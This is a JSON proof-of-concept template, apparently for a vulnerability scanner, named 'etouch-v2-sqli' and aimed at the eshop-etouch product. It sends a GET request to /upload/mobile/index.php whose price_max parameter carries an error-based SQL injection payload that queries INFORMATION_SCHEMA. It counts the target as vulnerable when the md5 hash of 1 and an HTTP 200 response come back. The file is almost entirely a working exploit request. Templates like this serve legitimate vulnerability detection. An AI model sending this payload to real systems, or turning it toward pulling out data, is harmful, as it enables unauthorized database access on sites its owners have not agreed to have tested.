{
    "Name": "etouch-v2-sqli",
    "Description": "etouch-v2-sqli",
    "Product": "eshop-etouch",
    "author": "chumeng",
    "Request":[
                {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "c4ca4238a0b923820dcc509a6f75849b"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
